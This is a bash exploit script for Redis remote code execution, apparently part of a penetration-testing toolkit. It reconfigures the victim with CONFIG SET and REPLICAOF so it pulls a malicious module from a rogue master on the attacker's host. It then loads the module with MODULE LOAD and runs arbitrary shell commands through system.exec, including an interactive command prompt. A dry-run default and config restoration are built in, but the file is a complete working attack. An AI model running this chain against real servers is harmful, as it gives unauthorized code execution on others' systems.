#!/usr/bin/env bash
# redis-rce-module.sh — MODULE LOAD RCE end-to-end.
#
# Two modes:
#   --direct   try to write the .so directly via DEBUG SETOBJ / file streaming
#              (rarely works against modern Redis — present as a fallback)
#   --rogue    spin up the bundled redis-rogue-master.py, REPLICAOF it, victim
#              pulls the .so over the wire and writes it to disk. (default)
#
# Flow (rogue mode):
#   1. Probe / auth target
#   2. Save victim CONFIG (dir, dbfilename, appendonly, masterauth)
#   3. Start rogue master in background, exposing module/system.so
#   4. CONFIG SET dir = /tmp     (or --remote-dir)
#      CONFIG SET dbfilename = exp.so
#      CONFIG SET appendonly = no
#      REPLICAOF <our-ip> <rogue-port>
#   5. Wait ~5s for the file write
#   6. REPLICAOF NO ONE
#   7. MODULE LOAD /tmp/exp.so
#   8. system.exec "<cmd>"
#   9. MODULE UNLOAD system   +   restore CONFIG
#   10. Optionally: rm /tmp/exp.so (only if attacker has shell already)

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_redis_lib.sh"

# ---------- args ----------
TARGET=""
PASS=""
USERNAME=""
CMD="id; uname -a; hostname"
BUNDLED_MODULE="$SCRIPT_DIR/module/system.so"
MODULE="$BUNDLED_MODULE"
REMOTE_DIR="/tmp"
REMOTE_NAME="exp_$RANDOM.so"
LOCAL_IP=""       # auto-detect if blank
ROGUE_PORT=46379
MODE="rogue"
INTERACTIVE=0
LEAVE_SO=0
EXPLOIT=0

# shellcheck disable=SC2034  # PASS/USERNAME are consumed by the sourced Redis helpers
while [ $# -gt 0 ]; do
    case "$1" in
        --target)      TARGET="$2"; shift 2 ;;
        --pass|-p)     PASS="$2"; shift 2 ;;
        --user|--username) USERNAME="$2"; shift 2 ;;
        --cmd|-c)      CMD="$2"; shift 2 ;;
        --module|-m)   MODULE="$2"; shift 2 ;;
        --remote-dir)  REMOTE_DIR="$2"; shift 2 ;;
        --remote-name) REMOTE_NAME="$2"; shift 2 ;;
        --local-ip)    LOCAL_IP="$2"; shift 2 ;;
        --rogue-port)  ROGUE_PORT="$2"; shift 2 ;;
        --direct)      MODE="direct"; shift ;;
        --rogue)       MODE="rogue"; shift ;;
        --interactive|-i) INTERACTIVE=1; shift ;;
        --leave-so)    LEAVE_SO=1; shift ;;
        --exploit)     EXPLOIT=1; shift ;;
        -h|--help)
            cat <<EOF
Usage: $0 --target host:port --exploit [--cmd 'shell-cmd'] [options]

Required:
  --target IP:PORT     Redis victim
  --exploit            REQUIRED to actually fire the MODULE LOAD chain. Without
                       it the script prints what it would do and exits 0.
                       Per CLAUDE.md §9 invariant 1.

Common:
  --cmd 'cmd'          shell to run via system.exec (default: $CMD)
  --pass PASSWORD      AUTH password
  --user USERNAME      Redis 6+ named ACL user (used with --pass)
  --interactive        drop into a system.exec REPL after MODULE LOAD

Module:
  --module FILE        path to compiled .so (default: $MODULE)

Rogue-master (default mode):
  --local-ip IP        IP victim should connect back to. Auto-detected if blank.
  --rogue-port PORT    port for fake master (default: $ROGUE_PORT)
  --remote-dir DIR     where victim drops the .so (default: $REMOTE_DIR)
  --remote-name NAME   .so name on victim (default: random)

Cleanup:
  --leave-so           don't try to remove the .so via system.exec after run

  -h, --help
EOF
            exit 0 ;;
        *) err "unknown arg: $1"; exit 1 ;;
    esac
done

[ -z "$TARGET" ] && { err "--target required"; exit 1; }
if [ "$EXPLOIT" != 1 ]; then
    log "DRY RUN — would chain CONFIG SET + REPLICAOF + MODULE LOAD against $TARGET"
    log "  mode:        $MODE"
    log "  cmd:         $CMD"
    log "  module:      $MODULE"
    log "  remote-dir:  $REMOTE_DIR"
    log "  remote-name: $REMOTE_NAME"
    log "  rogue-port:  $ROGUE_PORT"
    log ""
    log "  Re-run with --exploit to actually load the module and execute the command"
    log "  as the redis-server user. Authorized testing only."
    exit 0
fi
if [ "$MODULE" = "$BUNDLED_MODULE" ]; then
    command -v python3 >/dev/null 2>&1 || { err "missing provenance prerequisite: python3"; exit 1; }
    python3 "$SCRIPT_DIR/module/verify_source.py" >/dev/null || {
        err "bundled module source provenance verification failed"; exit 1;
    }
fi
if [ ! -f "$MODULE" ]; then
    err "module not built: $MODULE — a local compiler build is required"
    command -v make >/dev/null 2>&1 || { err "missing build prerequisite: make"; exit 1; }
    command -v "${CC:-cc}" >/dev/null 2>&1 || { err "missing build prerequisite: ${CC:-cc}"; exit 1; }
    err "building from vendored, checksummed source (see module/SOURCE.json)"
    if ! ( cd "$SCRIPT_DIR/module" && make >/dev/null 2>&1 ); then
        err "offline build failed. Check: $SCRIPT_DIR/module/{system.c,redismodule.h}"
        exit 1
    fi
    [ ! -f "$MODULE" ] && { err "still no $MODULE after build attempt"; exit 1; }
    hit "built $MODULE successfully"
fi
parse_target "$TARGET"

# ---------- cleanup trap ----------
SAVED_DIR=""; SAVED_DBFILE=""; SAVED_AOF=""
SAVED_ROLE=""; SAVED_MASTER_HOST=""; SAVED_MASTER_PORT=""
ROGUE_PID=""
LOADED=0
on_exit() {
    local rc=$? unload_out
    local cleanup_failed=0
    if [ "$LOADED" = 1 ]; then
        log "MODULE UNLOAD system"
        if ! unload_out=$(rcmd MODULE UNLOAD system 2>&1); then
            err "MODULE UNLOAD cleanup command failed: ${unload_out:-no response}"
            cleanup_failed=1
        elif ! redis_reply_is_ok "$unload_out"; then
            err "MODULE UNLOAD cleanup was not acknowledged: ${unload_out:-no response}"
            cleanup_failed=1
        fi
    fi
    if [ "$LEAVE_SO" = 0 ] && [ "$LOADED" = 1 ]; then
        # Try to remove the dropped .so via the now-unloaded module — only works
        # if a separate sysexec primitive is still available. Skip on best-effort.
        :
    fi
    if [ -n "$SAVED_ROLE" ]; then
        log "Restoring exact config and replication state"
        restore_config || cleanup_failed=1
        restore_replication_state || cleanup_failed=1
    fi
    if [ -n "$ROGUE_PID" ] && kill -0 "$ROGUE_PID" 2>/dev/null; then
        kill "$ROGUE_PID" 2>/dev/null || true
    fi
    trap - EXIT INT TERM
    if [ "$cleanup_failed" = 1 ]; then
        err "Redis restoration verification failed"
        # An unproved cleanup/restoration state is more actionable than the
        # main-path status and therefore always dominates it.
        rc=77
    fi
    exit "$rc"
}
trap on_exit EXIT INT TERM

# ---------- probe ----------
probe_redis || { err "redis unreachable at $HOST:$PORT"; exit 2; }
if [ "$AUTH_REQUIRED" = 1 ] && [ "$AUTHED" = 0 ]; then
    err "AUTH required and password not supplied/correct"; exit 3
fi
hit "Target: $HOST:$PORT (v${REDIS_VERSION:-?}, authed=$AUTHED)"

# Sanity: module load capability
probe_module_load_capability
if [ "$MODULE_LOAD_STATE" != "allowed" ]; then
    err "MODULE LOAD capability is $MODULE_LOAD_STATE: $MODULE_LOAD_REASON"
    exit 4
fi

if ! save_config; then
    err "cannot read complete persistence/replication/auth state; refusing mutation"
    exit 10
fi
log "Saved config — dir='$SAVED_DIR' dbfilename='$SAVED_DBFILE' appendonly='$SAVED_AOF' role='$SAVED_ROLE' upstream='${SAVED_MASTER_HOST:-}:${SAVED_MASTER_PORT:-}'"

# ---------- direct mode ----------
if [ "$MODE" = "direct" ]; then
    err "Direct write of binary via SAVE produces RDB-wrapped content; module load WILL fail."
    err "Direct mode is provided only for the case where you already have shell on the box."
    err "Use --rogue (default) for remote-only exploitation."
    exit 5
fi

# ---------- rogue mode ----------
if [ -z "$LOCAL_IP" ]; then
    # Discover the local IP that routes to the target
    LOCAL_IP=$(ip route get "$HOST" 2>/dev/null | awk '/src/ {for(i=1;i<=NF;i++) if($i=="src") {print $(i+1); exit}}')
    [ -z "$LOCAL_IP" ] && LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
fi
[ -z "$LOCAL_IP" ] && { err "could not auto-detect --local-ip; pass it explicitly"; exit 6; }
log "Local IP for callback: $LOCAL_IP:$ROGUE_PORT"

# Launch rogue master in the background
log "Starting rogue master (will serve $MODULE)"
python3 "$SCRIPT_DIR/redis-rogue-master.py" \
        --host 0.0.0.0 --port "$ROGUE_PORT" \
        --payload "$MODULE" --timeout 30 \
        > /tmp/rogue_${$}.log 2>&1 &
ROGUE_PID=$!
sleep 0.5
if ! kill -0 "$ROGUE_PID" 2>/dev/null; then
    err "rogue master failed to start; see /tmp/rogue_${$}.log"
    tail /tmp/rogue_${$}.log
    exit 7
fi

# Stage the victim
log "CONFIG SET dir=$REMOTE_DIR dbfilename=$REMOTE_NAME appendonly=no"
if ! config_out=$(rcmd CONFIG SET dir "$REMOTE_DIR" 2>&1); then
    err "CONFIG SET dir staging command failed: ${config_out:-no response}"; exit 8
fi
redis_reply_is_ok "$config_out" || { err "CONFIG SET dir staging failed: ${config_out:-no response}"; exit 8; }
if ! config_out=$(rcmd CONFIG SET dbfilename "$REMOTE_NAME" 2>&1); then
    err "CONFIG SET dbfilename staging command failed: ${config_out:-no response}"; exit 8
fi
redis_reply_is_ok "$config_out" || { err "CONFIG SET dbfilename staging failed: ${config_out:-no response}"; exit 8; }
if ! config_out=$(rcmd CONFIG SET appendonly no 2>&1); then
    err "CONFIG SET appendonly staging command failed: ${config_out:-no response}"; exit 8
fi
redis_reply_is_ok "$config_out" || { err "CONFIG SET appendonly staging failed: ${config_out:-no response}"; exit 8; }
# The bundled rogue master accepts the target's existing replication AUTH. Do
# not rewrite masterauth/masteruser merely to stage the transfer.

# Trigger replication
log "REPLICAOF $LOCAL_IP $ROGUE_PORT"
if ! replica_out=$(rcmd REPLICAOF "$LOCAL_IP" "$ROGUE_PORT" 2>&1); then
    err "REPLICAOF staging command failed: ${replica_out:-no response}"; exit 8
fi
redis_reply_is_ok "$replica_out" || { err "REPLICAOF staging failed: $replica_out"; exit 8; }

# Wait for rogue to log "Sent N bytes payload"
for _ in $(seq 1 20); do
    grep -q "Sent .* bytes payload" /tmp/rogue_${$}.log 2>/dev/null && break
    sleep 0.5
done
if ! grep -q "Sent .* bytes payload" /tmp/rogue_${$}.log; then
    err "rogue master never delivered payload — victim didn't connect back?"
    tail /tmp/rogue_${$}.log
    exit 8
fi
hit "Payload delivered to $HOST:$REMOTE_DIR/$REMOTE_NAME"

# Stop being a replica
log "REPLICAOF NO ONE"
if ! replica_out=$(rcmd REPLICAOF NO ONE 2>&1); then
    err "REPLICAOF NO ONE staging command failed: ${replica_out:-no response}"; exit 8
fi
redis_reply_is_ok "$replica_out" || { err "REPLICAOF NO ONE staging failed: ${replica_out:-no response}"; exit 8; }

# Load module
log "MODULE LOAD $REMOTE_DIR/$REMOTE_NAME"
if ! load_out=$(rcmd MODULE LOAD "$REMOTE_DIR/$REMOTE_NAME" 2>&1); then
    err "MODULE LOAD command failed: ${load_out:-no response}"
    exit 9
fi
if redis_reply_is_ok "$load_out"; then
    LOADED=1
    hit "MODULE LOAD success"
else
    err "MODULE LOAD failed: $load_out"
    err "Common causes: SELinux/AppArmor restricts dlopen on /tmp; try --remote-dir /var/lib/redis"
    exit 9
fi

# Execute
if [ "$INTERACTIVE" = 1 ]; then
    log "Interactive system.exec REPL (Ctrl-D to exit)"
    while IFS= read -r -p "cmd> " line; do
        [ -z "$line" ] && continue
        rcmd system.exec "$line"
        echo
    done
else
    log "system.exec '$CMD'"
    rcmd system.exec "$CMD"
fi
